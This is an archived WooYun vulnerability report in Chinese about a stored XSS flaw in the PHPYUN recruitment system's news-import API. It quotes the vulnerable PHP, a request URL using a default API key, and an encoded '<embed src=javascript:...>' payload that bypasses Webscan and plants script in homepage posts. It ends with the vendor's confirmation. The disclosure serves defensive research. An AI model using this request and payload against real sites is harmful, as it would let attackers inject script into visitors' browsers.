{"id": 68926, "wybug_id": "wooyun-2015-0128806", "wybug_title": "PHPYUN绕过Webscan向主页推送XSS招聘信息", "wybug_corp": "php云人才系统", "wybug_author": "menmen519", "wybug_date": "2015-07-24 18:34", "wybug_open_date": "2015-10-25 17:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["黑盒测试技巧", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向公众公开  简要描述： PHPYUN绕过Webscan向主页推送XSS招聘信息 详细说明：  api/locoy/model/news.class.php:\nclass news_controller extends common{\tfunction addnews_action(){//新闻添加\t\tinclude(\"locoy_config.php\");\t\tif($locoyinfo['locoy_online']!=1){\t\t\techo 4;die;\t\t}\t\tif($locoyinfo['locoy_key']!=trim($_GET['key'])){\t\t\techo 5;die;\t\t}        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){\t\t\techo 2;die;\t\t}\t\t$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}\t\t$content=$_POST['content'];\n发送url：http://localhost/phpyun40/upload/api/locoy/index.php?admin_dir=admin&m=news&c=addnews&key=phpyunpostdata:title=%D7%EE%D0%C2%D5%D0%C6%B8&color=%23E53333&content=%3Cembed%20src%3D%22javascript%3Aalert%281%29%22%2f%3E&nid=511112671&keyword=xxxxxx查看主页：\n\n点击查看招聘信息,出发XSS\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-27 17:38 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}